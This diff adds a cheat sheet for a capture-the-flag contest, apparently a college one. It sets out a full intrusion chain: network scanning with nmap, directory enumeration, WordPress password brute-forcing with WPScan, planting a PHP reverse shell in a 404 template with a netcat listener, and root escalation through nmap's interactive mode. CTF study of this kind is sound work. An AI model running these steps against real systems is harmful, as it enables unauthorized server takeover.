@@ -1,0 +1,119 @@
+Flags look like this: HC{}
+Submit them to: hackers@halesowen.ac.uk
+Submissions must only be one file with the flag name, directory, and contents.
+
+When we find a flag, move ours into a safer place and take a screenshot of the process.
+
+
+
+Decoding XOR, BASE64, Binary, Reversed Text: 
+https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'b4'%7D,'Standard',false)From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Hex('Auto')Reverse('Character')&input=ZmEgY2UgZmQgZDMgZmEgZGYgZWQgZDMgZmEgY2UgZDMgZDMgZmEgZGUgZGYgZDMgZmEgZGUgZGYgZDMgZmEgZGUgZjkgZDMgZmEgY2UgZjkgZDMgZmEgZGUgZjEgZDMgZmEgZTEgZWQgZDMgZjkgY2UgZmQgZDMgZjkgY2UgZmQgZDMgZjkgY2UgZjUgZDMgZjkgY2UgZmQgZDMgZmEgZGUgZjkgZDMgZmEgZGUgZDMgZDMgZmEgZTEgZWQgZDMgZjkgY2UgZWQgZDMgZmEgZGUgZjEgZDMgZjkgY2UgZjEgZDMgZmEgZGUgZWQgODk
+
+
+
+Decoding hashes:
+https://crackstation.net
+
+
+
+Decoding Spectogram Ciphers:
+https://www.dcode.fr/spectral-analysis
+
+
+
+Extracting data from images:
+steghide extract -sf IMAGE.jpg -p "The Password" / Password 
+
+
+Scanning for machines on network:
+ifconfig = Gets yout machine's IP address
+nmap -sV -p 1-65535 x.x.x.x/24 > NMAP_Result.txt
+sV - Services
+p - Ports
+1-65535 - All the ports
+x.x.x.x = Machine's IP address
+
+
+
+SSH into target machine:
+SSH (Username)@(IP Address)
+"yes"
+(Decoded Password)
+
+
+
+Linux commands to use when in machine:
+Reading Text Files = cat (file)
+Writing to text Files = nano (file)
+Seeing permissions = ls -all
+Seeing current Dir = pwd
+Remove and Move = rm (file), mv (file)
+Seeing current user = whoami
+
+
+
+Becoming root:
+sudo su
+
+
+
+Using Gobuster / Dirbuster to Enumerate a website:
+gobuster dir -u http://(IP) -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
+DirBuster is a GUI alternative within linux
+
+look for wp-login
+http://(IP)/wp-login = logging into the server
+http://(IP)/robots = Files that are hidden to users
+http://(IP)/(File) = downloads any hidden files within the website
+If you find a .dic file, you are winning in life.
+
+If the file contains duplicate information:
+cat (file).dic | sort -u > FilteredDictionary.txt
+Must find a Username for the website, the password may also be in there which we will later bruteforce.
+
+grep - searches for strings
+cat = printing text file
+| = puts result under other process
+
+
+
+Using WPScan to scan for bruteforcing login:
+wpscan --url http://(IP)/wp-login.php -U '(Username)' -P FilteredDictionary.txt
+^ This will look for the site's vulnerabilities while also bruteforcing the site
+Should print the username and password which can be used to login at http://(IP)/wp-login
+
+
+
+Reverse Shell by embedding code into the server:
+locate php-re
+cp /usr/share/webshells/php/php-reverse-shell.php .
+edit the script and change it to your system's IP and Port 443 and copy code
+edit the 404 template on the website admin page
+paste code in, replacing everything and save.
+
+
+
+Using NetCat to listen for this script activity:
+nc -lvnp 443
+access a non-existing page such as http://(IP)/69 to trigger the script.
+You now have access to the server.
+cd /home and look for flags.
+Get any hashes and decode them using crackstation.net
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+^ Upgrades the terminal
+su (Username)
+(Password from MD5)
+cat (Flag)
+
+
+
+export TERM=xterm
+^ Changes terminal mode
+nmap --version
+nmap --interactive
+!sh
+^ Switches to traditional linux root
+cd /root
+root may contain a flag, if it does: 
+cat (file)
